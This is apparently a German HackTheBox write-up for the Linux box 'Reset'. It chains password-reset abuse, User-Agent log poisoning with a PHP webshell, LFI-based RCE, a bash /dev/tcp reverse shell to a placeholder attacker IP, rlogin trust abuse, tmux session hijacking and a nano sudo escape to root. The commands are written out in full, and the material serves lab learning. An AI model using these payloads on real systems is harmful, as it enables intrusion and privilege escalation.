---
tags: [htb, linux, easy, writeup]
cve:
techniques: [password-reset, log-poisoning, lfi, reverse-shell, r-services, tmux-hijacking, sudo-abuse]
---
# Reset (Linux)

| Feld               | Wert             |
| ------------------ | ---------------- |
| OS                 | Linux            |
| Difficulty         | Easy             |
| Box IP             | `10.129.234.130` |
| Attacker IP (tun0) | `<attacker-ip>`  |

> [!info] Kill Chain
> [[Password Reset Abuse]] → Admin-Dashboard → [[Mail and Log Poisoning|Log Poisoning]] (via [[Local File Inclusion|LFI]]) → RCE → [[Reverse Shell]] → [[R-Services Abuse]] (rlogin als `sadm`) → [[tmux Hijacking]] (PW-Leak) → [[Sudo Abuse]] (nano) → **root**

---

# 1 · Enumeration
- `nmap -sC -sV 10.129.234.130` → 5 TCP-Ports offen.
- **Port 80**: Apache (Ubuntu) → Logs unter `/var/log/apache2/` (`access.log`, `error.log`). Im `access.log` steht der frei wählbare **User-Agent** → potenzieller Log-Poisoning-Träger ([[Mail and Log Poisoning|Log Poisoning]]).
	- Grundsatz: vom Angreifer kontrollierbare Eingaben (z. B. User-Agent), die ungefiltert gespeichert werden (z. B. im Log), sind potenzielle Einfallstore für Code-Injection
- **R-Services** (Vorgänger von SSH) → siehe [[R-Services Abuse]]:
	- veraltete Remote-Login-Dienste ohne Passwort, Authentifizierung über Host-/Username-Vertrauen → sicherheitskritisch, hier der spätere Weg zu User `sadm`
```
512/tcp open  exec   netkit-rsh rexecd
513/tcp open  login?
514/tcp open  shell  Netkit rshd
```

# 2 · Foothold

## 2.1 Password Reset → [[Password Reset Abuse]]
- `http://10.129.234.130` → Reset-Formular, Passwort für `admin` zurücksetzen.
- **DevTools → Network → POST → Response**: `new_password: 24bc0464`.
	- Schwachstelle: das neue Passwort steht in der Server-**Antwort** → im Browser unsichtbar, in den DevTools (Network) jedoch im Klartext lesbar
- Mit `admin` + diesem Passwort einloggen → **Admin-Dashboard** (Log-Viewer mit POST-Parameter `file=`).
	- `file=` ist entscheidend → lassen sich damit beliebige Dateien lesen, liegt eine [[Local File Inclusion|LFI]] vor

## 2.2 Session prüfen → [[curl]]
Log über das Session-Cookie auslesen (`-b PHPSESSID`):
```bash
curl http://10.129.234.130/dashboard.php \
  -b "PHPSESSID=13vsltn0mhkf744vc9hbb13q6k" \
  --data-urlencode "file=/var/log/apache2/access.log"
```
=> Im Log steht der eigene User-Agent (`Mozilla/5.0 …`) ungeprüft → vergiftbar.
- `-b "PHPSESSID=…"` sendet das Login-Cookie mit → ohne gültige Session kein Zugriff auf den Log-Viewer
- der eigene User-Agent taucht unverändert im Log auf → Beleg, dass eigene Eingaben 1:1 gespeichert werden. Nächster Schritt: statt eines Browsernamens PHP-Code einschleusen

## 2.3 Log Poisoning → [[Mail and Log Poisoning|Log Poisoning]] → RCE
**(1)** PHP-Webshell als User-Agent in den Log schreiben:
```bash
curl http://10.129.234.130/ \
  -H "User-Agent: <?php system(\$_GET['cmd']); ?>" \
  -b "PHPSESSID=13vsltn0mhkf744vc9hbb13q6k"
```
**(2)** Log via LFI einbinden + Befehl über GET auslösen:
```bash
curl "http://10.129.234.130/dashboard.php?cmd=id" \
  -b "PHPSESSID=13vsltn0mhkf744vc9hbb13q6k" \
  --data-urlencode "file=/var/log/apache2/access.log"
# => uid=33(www-data) gid=33(www-data) groups=33(www-data),4(adm)
```
> [!note] POST vs. GET im selben Request
> `file=` (zu lesende Datei) geht per **POST-Body**, `cmd=` (Befehl der Webshell) per **URL-Parameter**.

- zwei Schritte: (1) PHP-Code in den Log schreiben, (2) Log per `file=` einbinden → PHP führt den Code aus, die Webshell liest den Befehl aus `cmd=`
- `uid=33(www-data)` = Code-Ausführung erreicht, allerdings nur als Webserver-Benutzer. Kein regulärer Account, genügt aber für die Reverse Shell

## 2.4 Reverse Shell → [[Reverse Shell]]
```bash
# Terminal 1 (Kali) – Listener
nc -lvnp 4444
# Terminal 2 – Payload auslösen
curl "http://10.129.234.130/dashboard.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/<attacker-ip>/4444+0>%261'" \
  -b "PHPSESSID=13vsltn0mhkf744vc9hbb13q6k" \
  --data-urlencode "file=/var/log/apache2/access.log"
```
> [!warning] URL-Encoding in der cmd-URL
> Sonderzeichen müssen kodiert: `+` = Leerzeichen, `%26` = `&`, `'…'` = einfache Quotes (sonst fängt die lokale Bash sie ab).

- Reverse Shell statt Webshell: die Webshell ist umständlich (jeder Befehl ein eigener curl) → die Reverse Shell liefert eine vollwertige interaktive Shell
- Ablauf: `nc` lauscht lokal auf 4444, der Payload weist die Box an, sich zur eigenen IP:4444 zurückzuverbinden und eine Bash anzuhängen. `0>&1`/`>&` leiten Ein-/Ausgabe über die Verbindung

## User-Flag
```bash
cat /home/sadm/user.txt
# <redacted>
```

---

# 3 · Privilege Escalation

## 3.1 R-Services Abuse → [[R-Services Abuse]]
- Ziel: Wechsel vom stark eingeschränkten `www-data` zu einem regulären Benutzer. Kandidat: `sadm`
- Echte User finden (Dienstkonten rauswerfen → [[etc-passwd]]):
```bash
grep -vE 'nologin|false' /etc/passwd
# root ... local (1000) ... sadm (1001)
```
	- `-vE 'nologin|false'` filtert alle Einträge mit Shell `nologin`/`false` heraus = reine Dienstkonten. Übrig bleiben die tatsächlich anmeldbaren Benutzer
- `hosts.equiv` prüfen:
```bash
cat /etc/hosts.equiv
# + sadm        <- sadm darf sich ohne Passwort per R-Service einloggen
```
	- diese Datei ist die Vertrauensliste der R-Services. `+ sadm` erlaubt jedem Host die Anmeldung als `sadm` ohne Passwort → genau das wird ausgenutzt
- Auf Kali gleichnamigen User anlegen und per rlogin rein → [[rlogin]]:
```bash
sudo apt install rsh-client -y
sudo useradd sadm -m -s /bin/bash
sudo su - sadm
rlogin -l sadm 10.129.234.130         # Login ohne Passwort
```
	- Prinzip: R-Services vertrauen dem **Benutzernamen**, nicht einem Passwort. Daher lege ich auf Kali ebenfalls einen `sadm` an, wechsle lokal zu ihm (`su - sadm`) und melde mich an → die Box akzeptiert mich als ihren `sadm`

## 3.2 tmux Hijacking → [[tmux Hijacking]]
- `sudo -l` zeigt `timestamp_timeout=-1` → hat sadm **einmal** `sudo` mit Passwort bestätigt, bleibt die Authentifizierung **unbegrenzt** gültig.
- Genau diese **bereits authentifizierte** Session läuft noch (`w` → sadm auf `pts/3` in einer tmux-Session). Hänge ich mich dran, erbe ich den gültigen sudo-Zustand ohne erneute Passwort-Abfrage
	- tmux kommuniziert über einen Socket in `/tmp` → mit Leserechten darauf lässt sich per `attach` die laufende Session übernehmen, als säße man an sadms Terminal
	- der Scrollback-Verlauf enthält oft frühere Eingaben des Benutzers → hier das sudo-Passwort im Klartext. Verlauf stets prüfen
```bash
w                                     # sadm läuft in einer tmux-Session (pts/3)
ls -la /tmp/tmux-1001/                # Socket: /tmp/tmux-1001/default
tmux -S /tmp/tmux-1001/default attach
```
=> In der Scrollback-Historie der Session sieht man zusätzlich, dass sadm hier `sudo` genutzt hat – inkl. Passwort im Klartext:
```
echo 7lE2PAfVHfjz4HpE | sudo -S nano /etc/firewall.sh
```

## 3.3 Sudo Abuse (nano) → [[Sudo Abuse]]
```bash
sudo -l
# timestamp_timeout=-1
# (ALL) PASSWD: /usr/bin/nano /etc/firewall.sh
```
nano als Root-Shell (GTFOBins):
```
sudo nano /etc/firewall.sh
Strg+R → Strg+X
reset; sh 1>&0 2>&0
```
=> Root-Shell.
- Prinzip: `nano` darf als root gestartet werden. nano kann jedoch Befehle ausführen (`Strg+R` = Datei einlesen, `Strg+X` = Befehl statt Datei) → darüber lässt sich eine Shell starten, die als root läuft
- GTFOBins = Nachschlagewerk für solche Techniken: welches Programm sich mit Root-Rechten missbrauchen lässt und wie daraus eine Shell entsteht. Bei jedem erlaubten sudo-Befehl zuerst dort nachsehen

## Root-Flag
```bash
cat /root/root.txt
# <redacted>
```

---

## Notizen / Rabbit Holes
- **Apache-Log-Pfade**: Ubuntu/Debian `/var/log/apache2/`, RedHat/CentOS `/var/log/httpd/`.
- **Dienstkonten** (`nologin`/`/bin/false`) in `/etc/passwd` sind keine echten Login-User – nur damit Programme unter eigenem User laufen (z.B. Apache = `www-data`).
- **R-Services-Bedingung**: der lokale User (Kali) muss **denselben Namen** wie der Ziel-User haben (`sadm`).
- **`timestamp_timeout=-1`**: einmal `sudo` authentifiziert → bleibt gültig. In der Box-Beschreibung: „detached tmux session is used to abuse sudo".
